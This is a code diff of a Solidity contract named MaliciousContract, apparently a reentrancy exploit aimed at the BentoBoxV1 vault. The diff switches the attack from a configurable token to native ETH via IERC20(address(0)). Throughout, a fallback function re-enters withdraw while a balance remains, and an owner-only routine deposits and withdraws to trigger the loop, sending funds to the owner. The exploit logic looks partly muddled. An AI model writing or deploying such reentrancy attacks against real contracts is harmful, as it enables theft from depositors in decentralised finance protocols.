@@ -6,17 +6,14 @@ import "./BentoBoxV1.sol"; // Import BentoBoxV1 contract
 contract MaliciousContract {
     address public owner;
     BentoBoxV1 public targetContract;
-    IERC20 public token; // Declare token variable
 
     event AttackExecuted(uint256 amount);
     event WithdrawExecuted(uint256 amount);
     event BalanceBeforeAttack(uint256 balance);
 
-    constructor(address payable _targetContract, address _token) public {
-        require(_token != address(0), "Token address cannot be zero");
+    constructor(address payable _targetContract) public {
         owner = msg.sender;
-        targetContract = BentoBoxV1(_targetContract);
-        token = IERC20(_token); // Initialize token with the correct address
+        targetContract = BentoBoxV1(_targetContract); // Initialize target contract
     }
 
     // Explicitly add a receive function to handle incoming Ether
@@ -24,11 +21,11 @@ contract MaliciousContract {
 
     fallback() external payable {
         // Triggering reentrancy by calling withdraw again if there are available funds
-        uint256 balance = targetContract.balanceOf(token, address(this)); // Use the actual token address
+        uint256 balance = targetContract.balanceOf(IERC20(address(0)), address(this)); // Using the token interface for ETH
         if (balance > 0) {
             // Log the balance before attempting to withdraw
             emit BalanceBeforeAttack(balance);
-            targetContract.withdraw(token, address(this), owner, balance, 0);
+            targetContract.withdraw(IERC20(address(0)), address(this), owner, balance, 0); // Using the token interface for ETH
         }
     }
 
@@ -36,14 +33,14 @@ contract MaliciousContract {
         require(msg.sender == owner, "Not the owner");
 
         // Check balance before attack
-        uint256 beforeBalance = targetContract.balanceOf(token, address(this)); // Use the actual token address
+        uint256 beforeBalance = targetContract.balanceOf(IERC20(address(0)), address(this)); // Using the token interface for ETH
         emit BalanceBeforeAttack(beforeBalance);
 
         // Execute deposit to trigger the fallback function
-        targetContract.deposit(token, address(this), owner, beforeBalance, 0);
+        targetContract.deposit(IERC20(address(0)), address(this), owner, beforeBalance, 0); // Using the token interface for ETH
 
         // Now withdraw to trigger reentrancy
-        targetContract.withdraw(token, address(this), owner, beforeBalance, 0);
+        targetContract.withdraw(IERC20(address(0)), address(this), owner, beforeBalance, 0); // Using the token interface for ETH
 
         emit AttackExecuted(beforeBalance);
     }
